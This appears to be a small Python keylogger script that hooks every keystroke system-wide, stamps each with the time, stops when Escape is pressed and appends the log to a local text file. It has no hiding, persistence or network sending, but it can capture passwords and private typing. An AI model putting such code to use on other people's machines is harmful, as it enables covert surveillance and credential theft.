import keyboard
import datetime as dt

pressed = []
info = 'data.txt'

def key_press(event):
    #Keep track of each keystroke and time of input
    if event.event_type == 'down':
        current_time = event.time
        time_convert = dt.datetime.fromtimestamp(current_time)
        pressed.append(time_convert.strftime('%H:%M') + ' ' + event.name)

keyboard.hook(key_press)
keyboard.wait('esc')

#Results written to file
dong = '\n'.join(pressed)
with open(info, 'a') as data:
    data.write(dong)
    data.write('\n')